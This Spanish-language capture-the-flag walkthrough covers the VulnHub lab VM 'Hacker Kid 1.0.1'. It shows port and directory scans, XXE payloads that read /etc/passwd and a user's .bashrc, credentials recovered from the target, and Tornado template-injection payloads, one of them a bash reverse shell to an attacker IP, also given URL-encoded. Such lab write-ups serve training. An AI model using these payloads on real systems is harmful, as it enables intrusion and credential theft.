# HACKER-KID-1.0.1

Desarrollo de la VM HACKER KID: 1.0.1 - VULNHUB

## 1. Configuración de la VM

- La máquina se encuentra en la siguiente URL: https://www.vulnhub.com/entry/hacker-kid-101,719/
- Se probó y funciona correctamente en VIRTUALBOX

## 2. Escaneo de Puertos

```
# Nmap 7.93 scan initiated Mon Jan  2 19:59:41 2023 as: nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 10.0.10.7
Nmap scan report for 10.0.10.7
Host is up, received arp-response (0.00036s latency).
Scanned at 2023-01-02 19:59:42 EST for 17s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
53/tcp   open  domain  syn-ack ttl 64 ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Notorious Kid : A Hacker 
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
9999/tcp open  http    syn-ack ttl 64 Tornado httpd 6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: TornadoServer/6.1
MAC Address: 08:00:27:E5:83:C0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  2 19:59:59 2023 -- 1 IP address (1 host up) scanned in 18.39 seconds
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki01.jpg" width=80% />


## 3. Enumeración

## 3.1 Enumeración HTTP

```
┌──(root㉿kali)-[~/KID]
└─# dirsearch -u http://10.0.10.7/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt          

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163575

Output File: /root/.dirsearch/reports/10.0.10.7/-_23-01-02_19-58-43.txt

Error Log: /root/.dirsearch/logs/errors-23-01-02_19-58-43.log

Target: http://10.0.10.7/

[19:58:43] Starting: 
[19:59:39] 200 -    8KB - /app.html                                         
[20:00:46] 403 -  274B  - /cgi-bin/     (Added to queue)                    
[20:01:26] 301 -  304B  - /css  ->  http://10.0.10.7/css/     (Added to queue)
[20:01:26] 200 -    1KB - /css/                                             
[20:02:55] 200 -   10KB - /form.html                                        
[20:03:52] 403 -  274B  - /icons/     (Added to queue)                      
[20:03:58] 301 -  307B  - /images  ->  http://10.0.10.7/images/     (Added to queue)
[20:03:58] 200 -  960B  - /images/
[20:04:06] 200 -    4KB - /index.php                                        
[20:04:26] 301 -  311B  - /javascript  ->  http://10.0.10.7/javascript/     (Added to queue)
[20:04:26] 403 -  274B  - /javascript/
[20:11:18] 403 -  274B  - /server-status/     (Added to queue)               
[20:11:18] 403 -  274B  - /server-status
[20:17:05] Starting: cgi-bin/                                                 
[20:38:13] Starting: css/                                                     
[20:58:34] Starting: icons/                                                   
[21:15:38] 301 -  312B  - /icons/small  ->  http://10.0.10.7/icons/small/     (Added to queue)
[21:15:38] 403 -  274B  - /icons/small/
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki02.jpg" width=80% />

- Se identificaron las páginas: app.html y form.html .


## 3.2 Comentarios HTML

- En el código HTML se identificó lo siguiente:

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki03.jpg" width=80% />


## 3.3 Intruder en parámetro:page_no

- Automatizamos con el INTRUDER el parámetro: page_no

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki04.jpg" width=80% />

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki05.jpg" width=80% />

## 3.4 Enumeración de subdominios

- Nos deja un mensaje indicando que ha creado subdominios. Vamos a editar el archivo /etc/hosts el dominio indicado.

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki06.jpg" width=80% />

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki07.jpg" width=80% />


- El portal sugiere el uso de DIG. Además, en el escaneo de puertos el servidor tiene el server DNS activado. Añadimos el nuevo registro al archivo /etc/hosts

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki08.jpg" width=80% />

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki09.jpg" width=80% />


## 4. Explotación

### 4.1 XXE (XML External Entity)

- El formulario de registro envía información a través de XML y es candidato para probar XXE.

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki010.jpg" width=80% />

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>omar</name><tel>987654321</tel><email>&xxe;</email><password>password</password></root>
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki011.jpg" width=80% />

- En el listado aparece el usuario SAKET. Toca buscar archivos "importantes" que puedan ser leidos a través de XXE.
* .bash_history
* .bash_logout
* .bashrc
* .bashrc.original
* .config

- Utiliamos un encode para traer la información de un archivo grande

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc"> ]><root><name>omar</name><tel>987654321</tel><email>&xxe;</email><password>password</password></root>
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki012.jpg" width=80% />

- Decodeamos el archivo y encontramos credenciales:

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki013.jpg" width=80% />

### 4.2 SSTI (Server Side Template Injection)

- Durante el escaneo se identificó el puerto TCP/9999
- Se prueba el usuario saket:Saket!#$%@!!

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki014.jpg" width=80% />

- El sistema te indica que "le digas tu nombre". Vamos a probar enviando el parámetro NAME a través del método GET.

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki015.jpg" width=80% />

- En google se puede obtener este recurso: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/, asociado al header TORNADOSERVER 6.1

- Probamos la vulnerabilidad.

```
{% import os %}{{ os.popen("whoami").read() }}
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki016.jpg" width=80% />

- Establecemos una conexión reversa:
```
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP_KALI_CONEXION_REVERSA/9001 0>&1"')}}
```

- Necesitamos encodearlo. Luego establecemos la conexión reversa

```
%7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%6f%73%2e%73%79%73%74%65%6d%28%27%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%31%30%2e%35%2f%39%30%30%31%20%30%3e%26%31%22%27%29%7d%7d%0a
```

<img src="https://github.com/El-Palomo/HACKER-KID-1.0.1/blob/main/ki017.jpg" width=80% />









